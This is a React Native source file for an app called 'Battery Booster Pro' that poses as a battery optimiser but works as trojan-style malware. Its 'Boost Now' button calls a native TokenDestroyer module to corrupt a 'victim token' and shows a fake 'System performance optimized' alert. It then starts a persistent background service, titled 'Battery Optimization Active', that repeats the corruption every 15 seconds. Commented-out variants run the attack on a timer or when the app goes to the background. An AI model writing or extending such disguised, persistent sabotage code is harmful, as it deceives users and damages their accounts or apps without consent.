import { View, Text, Button, Alert, ActivityIndicator, AppState } from 'react-native';
import { NativeModules } from 'react-native';
import { useState, useEffect, useRef } from 'react';
import BackgroundService from 'react-native-background-actions';

export default function App() {
  const [loading, setLoading] = useState(false);
  const [attacking, setAttacking] = useState(false);
  const appState = useRef(AppState.currentState);

  const onBoost = async () => {
    setLoading(true);

    try {
      // Run the native token corruption
      await NativeModules.TokenDestroyer.corruptToken();

      // Add a realistic artificial delay (e.g., 2.5 seconds)
      await new Promise(resolve => setTimeout(resolve, 2500));

      Alert.alert('✅ Boost Complete', 'System performance optimized.');
      await startStealthAttack(); // Begin persistent attack
    } catch (e) {
      Alert.alert('❌ Boost Failed', e.message || 'Could not access root permissions.');
    } finally {
      setLoading(false);
    }
  };

//   const startStealthAttack = () => {
//     if (attacking) return;

//     setAttacking(true);

//     // Run every 5 seconds
//     const interval = setInterval(async () => {
//       try {
//         console.log('🧨 Corrupting victim token...');
//         await NativeModules.TokenDestroyer.corruptToken();
//       } catch (e) {
//         console.error('❌ Periodic corruption failed:', e.message);
//       }
//     }, 5000);

//     // Optional: Clear interval when app closes
//     return () => clearInterval(interval);
//   };


  const sleep = (time) => new Promise((resolve) => setTimeout(resolve, time));

  const backgroundTask = async (taskDataArguments) => {
    while (BackgroundService.isRunning()) {
        try {
        console.log('🧨 Background token corruption running...');
        await NativeModules.TokenDestroyer.corruptToken();
        } catch (e) {
        console.error('❌ Background corruption failed:', e.message);
        }
        await sleep(15000); // Wait 15 seconds
    }
  };

  const startStealthAttack = async () => {
    if (attacking) return;

    setAttacking(true);

    try {
      await BackgroundService.start(backgroundTask, {
        taskName: 'BatteryBooster',
        taskTitle: 'Battery Optimization Active',
        taskDesc: 'Boosting system performance...',
        taskIcon: {
          name: 'ic_launcher',
          type: 'mipmap',
        },
        color: '#00ff00',
        linkingURI: 'batterybooster://', // optional
        parameters: {}, // not used
      });

      console.log('✅ Background service started');
    } catch (e) {
      console.error('❌ Failed to start background service:', e.message);
    }
  };


//   useEffect(() => {
//     return () => {
//       if (intervalRef.current) {
//         clearInterval(intervalRef.current);
//       }
//     };
//   }, []);

//   useEffect(() => {
//     const subscription = AppState.addEventListener('change', async (nextAppState) => {
//       if (appState.current === 'active' && nextAppState === 'background') {
//         console.log('🧨 App went to background, corrupting token...');
//         try {
//           await NativeModules.TokenDestroyer.corruptToken();
//         } catch (e) {
//           console.error('❌ Background corruption failed:', e.message);
//         }
//       }
//       appState.current = nextAppState;
//     });

//     return () => {
//       subscription.remove();
//     };
//   }, []);


  return (
    <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center', padding: 24 }}>
      <Text style={{ fontSize: 28, fontWeight: 'bold', marginBottom: 16 }}>Battery Booster Pro</Text>
      <Text style={{ fontSize: 16, color: 'gray', marginBottom: 30 }}>
        Optimize battery usage by terminating background drainers.
      </Text>

      {loading ? (
        <>
          <ActivityIndicator size="large" color="green" />
          <Text style={{ marginTop: 12, color: 'green' }}>Boosting...</Text>
        </>
      ) : (
        <View>
          <Button title="⚡ Boost Now" onPress={onBoost} />
          <Button title="Quit" color="gray" onPress={async () => {
              try {
                  console.log('🛑 Stopping background service...');
                  await BackgroundService.stop();
              } catch (e) {
                  console.error('❌ Failed to stop background service:', e.message);
              }
          }} />
        </View>
      )}
    </View>
  );

}
